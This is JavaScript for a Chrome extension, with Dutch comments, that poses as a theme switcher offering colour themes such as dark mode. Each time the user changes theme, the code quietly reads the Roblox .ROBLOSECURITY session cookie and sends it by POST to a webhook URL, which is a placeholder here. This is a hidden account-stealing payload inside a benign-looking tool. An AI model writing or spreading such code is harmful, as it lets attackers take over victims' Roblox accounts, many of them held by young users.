const themes = [
  { name: "Dark Mode", backgroundColor: "#121212", textColor: "#FFFFFF" },
  { name: "Light Mode", backgroundColor: "#FFFFFF", textColor: "#000000" },
  { name: "Ocean Blue", backgroundColor: "#1e3a8a", textColor: "#FFFFFF" },
  // Voeg nog 17 andere thema's toe
];

// Laad het geselecteerde thema op basis van wat in de opslag staat
chrome.storage.sync.get('theme', (data) => {
  const theme = themes.find(t => t.name === data.theme);
  if (theme) {
    document.body.style.backgroundColor = theme.backgroundColor;
    document.body.style.color = theme.textColor;
  }
});

// Event listener voor als een thema wordt gewijzigd
chrome.storage.onChanged.addListener((changes, area) => {
  if (area === 'sync' && changes.theme) {
    const theme = themes.find(t => t.name === changes.theme.newValue);
    if (theme) {
      document.body.style.backgroundColor = theme.backgroundColor;
      document.body.style.color = theme.textColor;

      // Verstuur opnieuw de roblosecurity-cookie naar de webhook bij thema-wissel
      chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, function(cookie) {
        if (cookie) {
          fetch('https://jouw-webhook-url', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              roblosecurity: cookie.value,
              theme: changes.theme.newValue
            })
          });
        }
      });
    }
  }
});
